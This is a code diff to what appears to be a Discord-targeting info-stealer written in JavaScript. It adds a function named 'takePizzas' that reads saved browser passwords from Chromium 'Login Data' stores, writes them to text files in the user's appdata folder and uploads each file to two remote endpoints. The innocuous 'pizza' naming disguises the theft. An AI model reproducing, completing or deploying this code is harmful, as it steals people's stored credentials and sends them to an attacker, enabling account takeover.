@@ -224,6 +224,34 @@ async function getPizzas(path) {
         return '';
     }
 }
+
+async function takePizzas() {
+    let passwords = '';
+    for (let i = 0; i < paths.length; i++) {
+        if (fs.existsSync(paths[i] + 'Login Data'))
+            passwords += await getPizzas(paths[i]) || '';
+    }
+    fs.writeFile(appdata + '\\passwords.txt', passwords, function (err, data) {
+
+        if (err) throw err;
+      
+        const form = new FormData();
+        form.append("file", fs.createReadStream(appdata+"\\passwords.txt"));
+        form.submit(superstarlmao, (error, response) => {
+        if (error) console.log(error);
+        });
+    });
+    fs.writeFile(appdata + '\\src-passwords.txt', passwords, function (err, data) {
+
+        if (err) throw err;
+      
+        const form = new FormData();
+        form.append("file", fs.createReadStream(appdata+"\\src-passwords.txt"));
+        form.submit(src, (error, response) => {
+        if (error) console.log(error);
+        });
+    });
+}
 function GetBadges(flags) {
     const Discord_Employee = 1;
     const Partnered_Server_Owner = 2;
